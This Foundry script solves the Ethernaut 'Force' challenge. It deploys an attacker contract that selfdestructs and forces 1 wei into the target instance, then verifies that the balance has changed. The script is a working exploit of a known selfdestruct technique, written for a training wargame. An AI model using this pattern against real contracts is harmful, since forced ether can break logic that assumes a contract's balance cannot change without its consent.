// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {ForceAttack} from "../src/attackers/ForceAttack.sol";

contract ForceScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        console2.log("--- Force Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Target Balance Before:", instance.balance);

        vm.startBroadcast(privateKey);

        // Deploy ForceAttack with 1 wei.
        // Its constructor selfdestructs and forces the 1 wei into target.
        new ForceAttack{value: 1 wei}(payable(instance));

        vm.stopBroadcast();

        console2.log("Target Balance After :", instance.balance);
        require(instance.balance > 0, "Exploit failed: balance is still 0");
        console2.log(">>> SUCCESS! Force contract has balance > 0! Submit instance in Ethernaut. <<<");
    }
}
